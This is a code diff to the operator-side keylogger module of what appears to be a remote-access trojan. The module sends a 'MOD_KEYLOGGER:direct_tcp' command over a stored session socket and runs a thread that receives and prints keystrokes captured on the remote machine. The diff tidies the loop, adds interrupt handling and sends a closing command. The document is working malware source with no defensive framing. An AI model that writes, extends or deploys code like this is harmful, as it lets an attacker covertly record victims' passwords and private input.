@@ -1,4 +1,5 @@
 import threading
+import time
 from .handler import Handler
 #from .other import XOREncryption
 from .other import printColor
@@ -15,14 +16,13 @@ class Keylogger:
 
         self.session_nb = session_nb
         Keylogger.status_directTcp = True
-        print("in keylogg")
 
 
     def recvThread(self):
 
         
         while Keylogger.status_directTcp:
-            print("tread started ...")
+
             keystroke = CheckConn().recvsafe(Handler.dict_conn[self.session_nb ][NB_SOCKET],64,False)
             if not (keystroke):
                 #if error
@@ -30,20 +30,28 @@ class Keylogger:
             else:
                 print(keystroke,end="")
 
+
     def directTcp(self):
         
         if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb ][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
-         #   self.recvThread()
             
             recv_thread = threading.Thread(target=self.recvThread)
             recv_thread.start()
-
-            while True:
-                inp = input("\n>")
-                if(inp == "-b"):
-                    break
+            
+            checker = True
+            try:
+                while checker:
+                    #time.sleep(120)
+                    inp = input("\n")
+                    if(inp == "-b"):
+                        checker = False
+            except KeyboardInterrupt:
+                checker = False
+            
+            print("stop keylogger")
             Keylogger.status_directTcp = False
             recv_thread.join()
+            CheckConn().sendsafe(self.session_nb, Handler.dict_conn[self.session_nb ][NB_SOCKET], "\r\n")
             
             print("FINISHHHHHH") 
         else:
